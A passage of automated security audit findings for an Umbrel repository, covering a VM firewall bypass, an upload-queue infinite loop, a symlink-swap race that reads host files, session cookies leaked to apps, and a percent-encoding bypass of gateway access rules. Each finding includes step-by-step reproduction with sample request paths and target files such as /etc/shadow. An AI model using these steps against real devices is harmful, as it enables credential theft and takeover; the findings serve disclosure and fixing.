6. [packages/umbreld/source/modules/apps/legacy-compat/docker-compose.yml:19–23](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/apps/legacy-compat/docker-compose.yml#L19-L23)
   Defines umbrel_main_network as a Docker bridge on 10.21.0.0/16 (NETWORK_IP in app-script); every app container sits on this bridge with fixed, well-known addresses, so a guest can reach them by address once Docker's forward filtering is bypassed.
7. [packages/os/umbrelos.Dockerfile:390–396](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/os/umbrelos.Dockerfile#L390-L396)
   The shipped image pins Docker 28.5.0 (line 8) with its default iptables(-nft) integration (overlay daemon.json does not disable it; machines.vm.test.ts:623 asserts `ip filter DOCKER-USER` exists) and switches libvirt to its native nftables backend, which is the rule layout the DOCKER-USER/libvirt_network manipulation in libvirt.ts depends on.

## Impact
Guests gain unauthenticated network access to every app container's internal services — web UIs whose only login is the host app-gateway, databases with credentials fixed in public manifests, RPC/REST daemons — allowing read and modification of app data and configuration across all installed apps (C:H, I:H). Guests can also disrupt app services through those APIs or databases (A:L). Reach stays within the device's app containers; umbreld itself listens on loopback only, so host compromise is not shown.

## Reproduction steps
1. The attacker is code running inside any VM guest on the device: malware in a user's VM, a compromised guest OS, or a guest booted from an attacker-supplied image. From the guest it connects to an app container's fixed 10.21.x.y address and internal port (discoverable by scanning 10.21.0.0/16, or known from the public app-store manifests). No umbrelOS credentials or user interaction are needed; the rule is present whenever Machines is active. The guest sits on the 10.203.0.0/24 virtual segment attached to the host, so AV is Adjacent. Assumptions on dependencies as shipped: Docker 28.5.0 (umbrelos.Dockerfile:8) with its default iptables(-nft) integration creates `ip filter FORWARD` (policy DROP) → DOCKER-USER → DOCKER-FORWARD → DOCKER with a terminal drop for unpublished ports (machines.vm.test.ts:623 confirms the DOCKER-USER chain exists in the real image); libvirt's nftables backend (umbrelos.Dockerfile:394) emits an unrestricted `guest_output` accept for the NAT network.

## Recommended fix
The DOCKER-USER accept rule is keyed only on the ingress interface (`iifname umbrel-vm`) and therefore permits forwarding from guests to Docker bridge networks, not just to the LAN egress interface, defeating Docker's published-port isolation for app containers. Fix criteria: Guest-originated forwarded traffic must be accepted only toward the LAN/default-route interface (or explicitly excluded from Docker bridge subnets such as umbrel_main_network), while NAT egress and DNAT port-forward replies keep working. Verify by connecting from a guest to an app container's unpublished port: the connection must be dropped/rejected, while internet access and configured port forwards still function; ensureFirewall must re-assert the tightened rule.

---
**Severity:** HIGH
**Status:** Open
**Category:** Auth bypass
**CWE:** [CWE-653](https://cwe.mitre.org/data/definitions/653.html)
**Attack vector:** ADJACENT
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257923

---

# Keep-both upload publication loops forever on a dangling symlink, wedging the global upload queue

## Details
receiveUpload() stages the body in a random `.umbrel-upload` temp file and then, inside the box-wide `uploadPublicationQueue` (PQueue concurrency 1, no timeout), runs a `while (true)` publish loop. Each iteration starts from `requestedSystemPath`, calls `fse.pathExists(candidate)` to decide whether a keep-both unique name is required, authorises the candidate, and calls `publishUploadWithoutReplacing()`, which hard-links the temp file onto the candidate with link(2). If link fails with EEXIST and collision is 'keep-both', the loop `continue`s without changing any state.

When the requested destination name is occupied by a dangling symlink, the two checks disagree permanently: `fse.pathExists` (fs.access-based, follows the link) gets ENOENT and returns false, so `getUniqueName` – which uses the lstat-based `pathEntryExists` and would have produced a ' (2)' sibling – is never consulted and `candidate` stays equal to `requestedSystemPath`; `authorizeWritableDestinationSystemPath()` passes because `getDeepestExistingPath` uses the same `fse.pathExists`, so it validates the (in-base) parent directory; link(2) then fails with EEXIST because the directory entry exists and EEXIST is not in HARD_LINK_UNSUPPORTED_ERRORS. Every iteration is identical, so the loop never terminates, performing a dozen or so async fs calls per iteration in the root daemon.

Because the task never resolves, the single PQueue slot is held indefinitely. Every subsequent upload from any account – Files uploads (/api/files/upload, any collision mode) and Photos web/backup uploads (photos/api.ts calls receiveUpload with collision 'keep-both' and its publicationGuard wraps the same enqueuePublication) – blocks in `enqueuePublication()` after its body has been fully received, never responds, and keeps its temp file and UploadDiskPreflight reservation. The condition persists until umbreld is restarted and can be re-triggered at will.

A member account can create the precondition without shell access: upload an archive whose entry is a symlink to a non-existent relative target into their own home, call the member-capable tRPC `files.unarchive` on it (`getAllowedOperations` grants 'unarchive' for an archive file in the member home; extraction runs `unar` as root into a sibling directory), then `POST /api/files/upload?path=/Users/<slug>/<dir>/<linkname>&collision=keep-both`. The owner's Files/Photos uploads from the dashboard and the iOS photo backup then hang device-wide. Any other producer of a dangling symlink inside a Files root an owner uploads into with keep-both (an app writing into its own data directory, an SMB client where symlink creation is permitted) triggers the same wedge against the owner.

Assumptions: `unar` (installed from Debian in packages/os/umbrelos.Dockerfile:421) materialises symlink entries as symlinks – the project's own comment at api.ts:333-334 states 'Archive extraction can create symlinks'; fs-extra ^11.1.1 `pathExists` is fs.access-based and returns false on any error; p-queue ^7.3.0 has no default task timeout.

## Evidence
1. [packages/umbreld/source/modules/files/api.ts:387–404](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L387-L404)
   The publish loop decides whether a unique name is needed with fse.pathExists(candidate) (fs.access-based, follows symlinks, false for a dangling symlink), then calls publishUploadWithoutReplacing which uses link(2). link fails with EEXIST because the directory entry exists, and the keep-both branch `continue`s without ever changing `candidate`. Nothing in the loop body can change between iterations, so it never terminates.
2. [packages/umbreld/source/modules/files/api.ts:21–24](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L21-L24)
   uploadPublicationQueue is module-global with concurrency 1 and no timeout, shared by every HTTP upload (Files and Photos). The non-terminating publish task holds its only slot, so every later upload's enqueuePublication() waits forever.
3. [packages/umbreld/source/modules/files/api.ts:443–450](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L443-L450)
   Both Files (/api/files/upload) and Photos (receiveUpload is imported by photos/api.ts with collision 'keep-both'; its publicationGuard wraps this same enqueuePublication) funnel publication through this queue, so the hang affects all accounts and both features until umbreld restarts.
4. [packages/umbreld/source/modules/files/api.ts:89–92](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L89-L92)
   publishUploadWithoutReplacing rethrows EEXIST (not in HARD_LINK_UNSUPPORTED_ERRORS), which is exactly the error the caller treats as 'retry with a new unique name' even though no new name is ever chosen.
5. [packages/umbreld/source/modules/files/files.ts:2447–2454](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2447-L2454)
   pathEntryExists is lstat-based and returns true for a dangling symlink. getUniqueName (files.ts:2020-2034) loops on it and would produce a ' (2)' sibling, but the publish loop gates the call to getUniqueName on the access-based fse.pathExists, so for a dangling symlink the lstat-based check is never reached. This is the inconsistency the loop has no guard against.
6. [packages/umbreld/source/modules/files/files.ts:2457–2474](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2457-L2474)
   getDeepestExistingPath also uses fse.pathExists, so for a dangling-symlink final component authorization (virtualToSystemPath -> assertSystemPathInsideBase, and authorizeWritableDestinationSystemPath's parent check) validates the in-base parent and passes on every iteration, never throwing out of the loop.
7. [packages/umbreld/source/modules/files/archive.ts:215–217](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/archive.ts#L215-L217)
   unarchive() runs `unar` as root into the requester's own directory; symlink entries in the archive are materialised as symlinks (api.ts:333-334 states 'Archive extraction can create symlinks'). files.unarchive is privateProcedureWithMembers (routes.ts:323), so a member with no shell can place a dangling symlink at a name of their choosing in their own home.
8. [packages/umbreld/source/modules/files/api.ts:149–150](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L149-L150)
   POST /upload is authorised by authorizeDashboardRequest, which returns the principal of any active account session (auth.ts:393-438), so a member account can issue the keep-both upload against its own home path.

## Impact
Complete, persistent loss of the upload surface (Files uploads, Photos web uploads and native photo backup) for all accounts until a daemon restart, plus a continuously busy async loop in the root daemon. No data is read or modified.

## Reproduction steps
1. A member logs into the dashboard, uploads a zip containing a dangling symlink entry into their home, calls the member-capable `files.unarchive` procedure, then issues a single keep-both upload to the symlink's name. The publish task never completes and holds the global publication slot; every later upload (any account, Files or Photos) hangs until the owner restarts umbreld. No race, no special configuration, repeatable at will.

## Recommended fix
1. The publish loop's existence check (fse.pathExists, follows symlinks) and its claim primitive (link(2), sees directory entries) disagree on dangling symlinks, and the keep-both retry branch does not force a new candidate name, so the loop has no progress guarantee. Fix criteria: Publication must terminate for every directory state: an EEXIST from link(2) must always lead to a different candidate name (or a bounded failure response), and existence should be decided with lstat-based semantics consistent with getUniqueName. Verify by placing a dangling symlink at the target name and issuing a keep-both upload: the request must complete (unique name or error) and later uploads from other accounts must not be delayed.
2. A single box-wide PQueue slot is held by a task with no timeout or iteration bound, so one misbehaving upload denies the feature to every account. Fix criteria: A single upload's publication step must not be able to block other accounts' uploads indefinitely (bounded retries/iterations or a per-destination rather than global serialisation). Verify that a stuck or slow publication for one path does not prevent an unrelated path's upload from completing.

---
**Severity:** HIGH
**Status:** Open
**Category:** Infinite loop
**CWE:** [CWE-835](https://cwe.mitre.org/data/definitions/835.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** NONE
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257922

---

# Files /view and /download serve by path after authorization, allowing symlink-swap TOCTOU read of host files

## Details
The Files HTTP read endpoints authorise a request by resolving the virtual path (`virtualToSystemPath`), which checks that the *current* realpath lies inside the account's base directory, but then stream the file by pathname (`response.sendFile(systemPath)` in /view and /download, `archive.directory/file(systemPath)` for zip downloads). `virtualToSystemPath` intentionally returns the unresolved path (files.ts 2229-2231). The kernel re-resolves every component at open time, so if a parent component is swapped for a symlink between the check and the open, the daemon (root) reads and returns a file outside the virtual filesystem.

The maintainers identified exactly this gap and added `files.openFileForRead()` (files.ts 2234-2268), which opens with O_NOFOLLOW, re-authorises, and verifies the held descriptor's dev/ino against the canonical target; Photos' streaming routes use it. The Files routes /api/files/view and /api/files/download were not converted and still call sendFile on the pathname. The VM tests for these routes assert only the static case ('no product surface creates symlinks'), which is contradicted by archive extraction.

Exploit by a member account (no shell): (1) upload a zip containing a symlink entry `D -> /home/umbrel/umbrel` (or `/etc`) and unarchive it into `/Users/<slug>/B/`; (2) create a real directory `/Users/<slug>/A/D/` containing a dummy file named like the target (e.g. `umbrel.yaml` or `shadow`); (3) repeatedly request `GET /api/files/view?path=/Users/<slug>/P/D/umbrel.yaml&token=...` while concurrently alternating tRPC `files.rename` calls that swap `A`<->`P` and `B`<->`P`. Renaming `A`/`B`/`P` is permitted because each directory's own realpath is inside the member's home; only the symlink *inside* it escapes. When the swap lands between the realpath check and sendFile's open, the response body is `/home/umbrel/umbrel/umbrel.yaml` (owner password hash, Samba/network-share credentials) or `/home/umbrel/umbrel/secrets/...` (session store, JWT secret), yielding owner-level takeover. The window in /view includes status() (lstat, getAllowedOperations, thumbnail index round-trip) and is comfortably winnable with automated retries; there is no lockout.

The same check-then-use pattern affects the mutation primitives in files.ts (copy/move/delete), which is recorded separately as files-mutation-path-toctou-symlink-swap.

Assumptions: `unar` extracts symlink entries as symlinks (Debian unar, Dockerfile line 421); Express 4 `res.sendFile` opens by pathname with symlink following.

## Evidence
1. [packages/umbreld/source/modules/files/api.ts:531–556](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L531-L556)
   /view authorises with virtualToSystemPath (realpath containment check) and then much later calls response.sendFile(systemPath) which re-resolves the unresolved path through the kernel; status() in between adds several awaited fs/worker calls, widening the window.
2. [packages/umbreld/source/modules/files/api.ts:172–201](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/api.ts#L172-L201)
   /download authorises each path with virtualToSystemPath (175), then fse.exists/fse.stat and response.sendFile(files[0]) (192) on the unresolved pathname; for directories or multiple paths it hands the pathnames to archive.createZipStream (201), whose archive.directory/archive.file (archive.ts:67-79) also re-open by path. No descriptor-bound identity check on either branch.
3. [packages/umbreld/source/modules/files/files.ts:2227–2231](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2227-L2231)
   virtualToSystemPath validates realpath containment but deliberately returns the as-passed, unresolved system path. Any path component may be replaced by a symlink between this check and the later open.
4. [packages/umbreld/source/modules/files/files.ts:2234–2267](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L2234-L2267)
   openFileForRead() was written specifically to close this gap ('Path-based authorization alone leaves a small gap in which a parent can be swapped before sendFile/open resolves it') and binds the stream to a descriptor whose inode is re-validated. Photos (photos/api.ts streamAuthorizedFile) uses it; the Files HTTP routes do not.
5. [packages/umbreld/source/modules/files/files.ts:1252–1285](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/files.ts#L1252-L1285)
   rename() is the attacker's swap primitive: a member may rename directories inside their own home freely; a directory whose child is an escaping symlink still passes virtualToSystemPath because the directory itself resolves inside the base.
6. [packages/umbreld/source/modules/files/archive.ts:215–217](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/files/archive.ts#L215-L217)
   unarchive() runs unar as root and materialises symlink entries, giving a shell-less member a way to plant an absolute symlink (e.g. -> /home/umbrel/umbrel or /etc) inside their own home. api.ts line 333 acknowledges 'Archive extraction can create symlinks'.

## Impact
umbreld runs as root, so a won race returns any host file: /home/umbrel/umbrel/umbrel.yaml (owner password hash, plaintext network-share credentials), secrets/ (session store, signing material), /etc/shadow. Stolen owner session material yields owner-level control of the device, so integrity is compromised as well; no direct availability impact.

## Reproduction steps
1. A member with a dashboard session (member tier: routes.ts files.rename/files.unarchive and user/routes.ts getHttpApiToken are privateProcedureWithMembers; authorizeHttpApi admits members for file-view/file-download) uploads an archive containing an absolute symlink entry, unarchives it into their own home (archive.ts:217 runs unar as root with no post-extraction sanitisation; api.ts:333 states 'Archive extraction can create symlinks'), then races GET /api/files/view (or /download) against tRPC rename calls that swap a parent directory of the requested path between a real directory and one containing the escaping symlink. Each rename passes virtualToSystemPath because the directory's own realpath is inside the member home. The check (realpath in assertSystemPathInsideBase) and the open (send's fs.stat/createReadStream inside res.sendFile) are separated by several awaited fs calls (status(): lstat, getAllowedOperations lstat, thumbnail lookup), and retries are unlimited. Dependency assumptions: Debian unar materialises symlink entries as symlinks; express ^4.18.2 res.sendFile (send) opens by pathname following symlinks; archiver ^7.0.1 directory/file open by pathname. None verified in checkout.

## Recommended fix
1. /view and /download authorise a pathname and then let sendFile/archiver re-resolve that pathname, so the authorised object and the served object can differ. Fix criteria: Bytes served by /api/files/view and /api/files/download (including zip entries) must come from a descriptor that was opened and identity-checked against the authorised canonical target, as openFileForRead already does for Photos. Verify by swapping a parent directory for an escaping symlink between authorisation and open (e.g. with a test hook that pauses the handler) and confirming the response is a 4xx rather than host file content.
2. Archive extraction allows escaping symlinks to be created inside user-writable trees, which is the precondition for every path-swap attack in this module. Fix criteria: Extraction into the virtual filesystem must not create symlinks that resolve outside the destination tree (strip or reject symlink entries, or re-validate every extracted link). Verify by unarchiving an archive containing an absolute symlink and confirming no escaping link exists afterwards.

---
**Severity:** HIGH
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257920

---

# Umbrel app-session and browser-session cookies forwarded verbatim to directly-published apps

## Details
Logging into the dashboard (user.login), or into any app via app-auth, sets the 'app-gateway' audience credential as a cookie (UMBREL_APP_SESSION over HTTP, __Host-UMBREL_APP_SESSION_HTTPS over HTTPS) together with the browser-session cookie. Browser cookies are scoped by host, not port, so these cookies accompany every request the browser makes to any port on the device's hostname or IP.

For apps that declare an app_proxy service, LAN ingress routes traffic through AppGateway, which strips these cookies before proxying (stripCookies/stripAppGatewayCookies). For apps that publish their UI port directly (compose `ports:` mapping the manifest port, or `network_mode: host`), LAN ingress forwards traffic straight to the app: plain HTTP is raw-forwarded by forwardTcp and HTTPS is terminated and proxied by createHttpsProxyServer(publicPort) whose middleware does not touch the Cookie header. The third-party container therefore receives the owner's (or a member's) valid app-gateway token in clear.

A malicious or compromised directly-published app (community app stores are attacker-controlled in the threat model; many legitimate apps such as host-network or self-publishing apps use this shape) can harvest the token from its access logs or request handler and use it from inside its container: connect to 10.21.0.1:<other app's port> (nftables redirects this to that app's gateway), present the cookie, and be authenticated as the owner against every gateway-protected app on the device (wallets, Nextcloud, etc.), or call /app-auth/v1/account/session to mint handoffs. authorizeApp grants an owner credential access to all apps, so the credential captured by one app is a device-wide app credential. The browser-session cookie is also disclosed, though it is not sufficient alone for dashboard access.

The code's own intent (comment in app-gateway-cookie.ts) is that untrusted apps must not capture these credentials; the direct-route paths contradict that. The HTTPS direct path has an HTTP-aware hop where stripping is straightforward; the plain-HTTP direct path is a raw TCP replay and would need an HTTP-parsing hop (as gateway routes already have) or a cookie design that is not host-wide.

## Evidence
1. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:867–888](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L867-L888)
   For routes without an app_proxy gateway (route.gateway undefined), upstreamPort is the app's own public port: plain HTTP from the mux is raw-forwarded to 127.0.0.1:<publicPort> and HTTPS is terminated by createHttpsProxyServer(publicPort) and proxied to the same app port. No AppGateway sits in between, so nothing strips Umbrel cookies.
2. [packages/umbreld/source/modules/lan-ingress/lan-ingress.ts:1050–1107](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/lan-ingress.ts#L1050-L1107)
   createProxyMiddleware() used for the direct-route HTTPS hop only adjusts x-forwarded-* and strips HSTS; the client's Cookie header, including UMBREL_APP_SESSION / __Host-UMBREL_APP_SESSION_HTTPS and UMBREL_BROWSER_SESSION(_HTTPS), is forwarded to the app unchanged.
3. [packages/umbreld/source/modules/lan-ingress/forward-tcp.ts:4–47](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/lan-ingress/forward-tcp.ts#L4-L47)
   The plain-HTTP direct path replays the classified bytes and pipes the socket to the app port verbatim, so the Cookie header reaches the app unmodified.
4. [packages/umbreld/source/modules/auth/app-gateway-cookie.ts:47–73](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/app-gateway-cookie.ts#L47-L73)
   setAppGatewayCookie() issues the app-gateway credential as a cookie with path=/ and no Domain attribute, i.e. scoped to the hostname and therefore sent by browsers to every port on umbrel.local/<ip>, including directly-published app ports. stripAppGatewayCookies() exists precisely so 'an untrusted app cannot capture a credential', but it is only invoked by AppGateway, never on direct routes.
5. [packages/umbreld/source/modules/app-gateway/app-gateway.ts:262–265](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/app-gateway/app-gateway.ts#L262-L265)
   stripCookies() is the only place Umbrel credentials are removed before reaching an app, and it runs only for gateway-protected apps.
6. [packages/umbreld/source/modules/auth/auth.ts:579–585](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/auth/auth.ts#L579-L585)
   authorizeApp(): an 'app-gateway' credential belonging to the owner session authorises access to every installed app; the captured cookie is therefore a cross-app credential, not one scoped to the app that received it.
7. [packages/umbreld/source/modules/server/app-auth.ts:190–202](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/server/app-auth.ts#L190-L202)
   /app-auth/v1/account/session accepts the app-gateway cookie alone and mints handoffs for any app the session may access, giving a holder of the stolen cookie a second way to log into other apps.

## Impact
The captured credential is the owner's app-gateway token, which authorizeApp accepts for every installed app. One untrusted container gains read/write access to all other apps' authenticated UIs/APIs for the session lifetime (7 days, renewable while the owner keeps using the dashboard). Availability is not affected.

## Reproduction steps
1. Attacker position: author of an installed app whose UI port is published directly (compose `ports:` on the manifest port, or `network_mode: host`) — a supported shape (`canRouteAppDirectly`, VM fixtures `bridge`/`host`). Delivery: the owner (or a member), already logged into the dashboard (user.login sets the cookie) or into any app via app-auth, opens the app's UI. The cookie is set with path=/ and no Domain, so the browser attaches UMBREL_APP_SESSION (HTTP) or __Host-UMBREL_APP_SESSION_HTTPS (HTTPS) to every port on the hostname; the direct route forwards it unchanged (raw forwardTcp for HTTP, createProxyMiddleware with no cookie handling for HTTPS). Use: apps are given GATEWAY_IP 10.21.0.1 (legacy-compat/app-environment.ts); the nftables PREROUTING rule `fib daddr type local iifname != "lo" tcp dport <port> redirect` applies to bridge traffic, so the container reaches every other app's gateway at 10.21.0.1:<port>; the gateway sees a 127.0.0.1 peer and accepts the HTTP cookie name (or the HTTPS name over TLS/with X-Forwarded-Proto: https), and authorizeApp grants an owner credential every app. The token also mints handoffs via /app-auth/v1/account/session. Requires the malicious direct-published app to be installed (attack requirement) and a passive victim visit.

## Recommended fix
1. Direct (non-gateway) app routes in LAN ingress forward the browser's Cookie header, including host-scoped Umbrel session credentials, to third-party containers; only gateway routes strip them. Fix criteria: No Umbrel-issued credential cookie (app-gateway, browser-session, legacy proxy-token names) may reach an app container on any ingress path, including the direct-route HTTPS proxy and the direct-route plain-HTTP forward. Verify: a directly-published echo app receiving requests with UMBREL_APP_SESSION, __Host-UMBREL_APP_SESSION_HTTPS and UMBREL_BROWSER_SESSION cookies over both http:// and https:// observes none of them while unrelated cookies are preserved.
2. The app-gateway credential is a single host-wide cookie valid for every app the account may access, so disclosure to one app compromises all apps. Fix criteria: Limit the blast radius of a disclosed app credential: a credential presented to one app's gateway must not be usable for other apps (e.g. per-app credentials or handoff-bound tokens), or at minimum must not be issuable on hostnames where directly-published apps can receive it. Verify: a token captured on app A's port is rejected by app B's gateway and by /app-auth/v1/account/session for app B.

---
**Severity:** HIGH
**Status:** Open
**Category:** Credential exposure
**CWE:** [CWE-201](https://cwe.mitre.org/data/definitions/201.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/umbrel
**Branch:** main
**Commit:** fae798071e87c53dd2833af649dcaf4d60b84500
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_013wzGGrZsCxqDCQQkNFbs53&finding=scan_01Uc5wvZcjbRhyvc4aq51Gy8-5257919

---

# Percent-encoded request paths bypass app gateway PROXY_AUTH_BLACKLIST and widen whitelist matching

## Details
The in-process app gateway (which replaced the app_proxy sidecar) enforces per-app Umbrel login unless the request path matches PROXY_AUTH_WHITELIST and does not match PROXY_AUTH_BLACKLIST. isAuthorized() (app-gateway.ts:270) performs that match on `new URL(request.url, 'http://umbrel.local').pathname`, a WHATWG pathname in which ordinary percent-escapes are preserved verbatim (only '.'/'..' and their %2e forms are resolved as dot segments), and pathMatches() (lines 103-128) compares that string against the rules with plain startsWith/equality. The request is then proxied (handleRequest line 316, handleUpgrade line 330) with the original encoded request.url, which http-proxy 1.18.1 forwards undecoded and the upstream app decodes.

Because the authorisation decision is made on a non-canonical form of the path while the upstream acts on the canonical (decoded) form, an unauthenticated LAN/Tor/Tailscale client can reach blacklisted paths without Umbrel login:

- Rules `PROXY_AUTH_WHITELIST=/public/*`, `PROXY_AUTH_BLACKLIST=/public/private/*` (the exact shape of the repository's own lan-ingress VM fixture, lan-ingress.vm.test.ts:711-712, whose test at lines 370-375 asserts /public/private/status must redirect to login): `GET /public/%70rivate/secret` is whitelisted (prefix `/public/`), is not blacklisted (does not start with `/public/private/`), and is forwarded raw. Upstreams that percent-decode the path before routing or file lookup — nginx and Apache ($uri / path normalisation), Go net/http (URL.Path is decoded), WSGI/ASGI frameworks (PATH_INFO is decoded), Java servlet containers (getServletPath/getPathInfo), static-file servers such as Express serve-static/send — serve `/public/private/secret`. (Express's own router matches static route strings against the raw pathname, so pure Express route handlers are not reached this way; its static-file middleware is.)
- Prefix rules without a trailing slash (`/api*`) are widened the same way: `/api%2Fadmin/x` matches the whitelist, misses an `/api/admin/*` blacklist, and an upstream that decodes %2F in the URI (e.g. nginx) serves `/api/admin/x`.

The same isAuthorized() gates WebSocket upgrades, so the bypass applies to HTTP and WS traffic. The defect is validate-before-canonicalise ordering: the gateway must decide on the same canonical path the app will act on (decode, normalise, and reject or re-encode ambiguous sequences) or forward only the canonical path it validated.

Reachability: lan-ingress.ts:868-889 constructs an AppGateway for every installed app that declares an `app_proxy` service and fronts it on the app's nftables-redirected public port; auth is on by default (app-gateway.ts:95). Any such app whose rules include blacklist entries (or prefix-wildcard whitelist entries) beneath a whitelisted area is affected; the attacker needs only network access to the app's public port (LAN, Tailscale, or the app's Tor hidden service). Dependency assumption: http-proxy-middleware 2.0.7 / http-proxy 1.18.1 (package-lock.json) forward `req.url` via `url.parse(req.url).path` without percent-decoding.

## Evidence
1. [packages/umbreld/source/modules/app-gateway/app-gateway.ts:268–285](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/app-gateway/app-gateway.ts#L268-L285)
   isAuthorized() (line 270) derives the path for the whitelist/blacklist decision from new URL(request.url, 'http://umbrel.local').pathname. The WHATWG parser preserves ordinary percent-escapes verbatim (it only resolves '.', '..' and their %2e forms as dot segments), so '/public/%70rivate/x' is evaluated as the literal string '/public/%70rivate/x': it matches a '/public/*' whitelist rule and misses a '/public/private/*' blacklist rule, and line 273 returns without any authentication. The same function gates WebSocket upgrades (handleUpgrade, line 323).
2. [packages/umbreld/source/modules/app-gateway/app-gateway.ts:103–128](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/app-gateway/app-gateway.ts#L103-L128)
   normalisePath()/pathMatches() compare the undecoded pathname against the literal rule strings with startsWith/equality only; no percent-decoding or canonicalisation precedes the comparison, so the authorisation decision is made on a non-canonical form of the path.
3. [packages/umbreld/source/modules/app-gateway/app-gateway.ts:294–331](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/app-gateway/app-gateway.ts#L294-L331)
   After isAuthorized() returns, handleRequest hands the Express request to this.#proxy (http-proxy-middleware 2.0.7 over http-proxy 1.18.1, no pathRewrite) and handleUpgrade calls this.#proxy.upgrade; both forward the original, still-encoded request.url to the app container. The upstream HTTP server decodes it and serves the blacklisted resource.
4. [packages/umbreld/source/modules/app-gateway/app-gateway.ts:64–100](https://github.com/Halbarevi/umbrel/blob/fae798071e87c53dd2833af649dcaf4d60b84500/packages/umbreld/source/modules/app-gateway/app-gateway.ts#L64-L100)
